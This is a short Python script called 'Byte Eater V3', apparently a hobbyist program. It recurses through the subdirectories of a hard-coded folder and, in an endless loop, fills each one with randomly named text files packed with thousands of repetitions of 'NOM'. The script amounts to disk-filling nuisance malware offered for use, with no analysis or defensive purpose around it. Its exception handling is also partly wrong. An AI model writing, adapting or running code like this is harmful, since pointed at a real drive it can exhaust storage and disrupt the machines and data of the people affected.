


# BYTE EATER V3
# A SAMWRIGH-T PROGRAM
# USE AT YOUR OWN RISK


import os
import random
dictionary = "abcdefghijklmnopqrstuvwxyz123456789"




def GetSubDirectories(parentDir):
    subDirectories = []
    try:
        currentDirectory = os.listdir(parentDir)
    except FileNotFoundError:
        return False
    for x in range(0,len(currentDirectory)-1):
        if (str(currentDirectory[x])[0]!="$"):
            if (str(currentDirectory[x])[-4:] != ".sys"):
                try:
                    GetSubDirectories(parentDir + str(currentDirectory[x]))
                    subDirectories.append(currentDirectory[x])

                except PermissionError or FileNotFoundError:
                    continue
    return subDirectories

baseDir = str("C:/Users/Sam/Desktop/Testy/")
#print(baseDir + GetSubDirectories(baseDir)[0] + "/hi.txt")


def RandomFileName():
    name = "/"
    for i in range(random.randint(3,12)):
        name += dictionary[random.randint(0,(len(dictionary)-1))]
    name += ".txt"                  
    return name

try:
    while True:
        directories = GetSubDirectories(baseDir)
        for x in range(len(directories)):
            file = open(baseDir + str(directories[x]) + RandomFileName(), "w")
            for i in range(0, random.randint(500,10000)):
                file.write("NOM")
            file.close()
except KeyboardInterrupt:
    file.close()

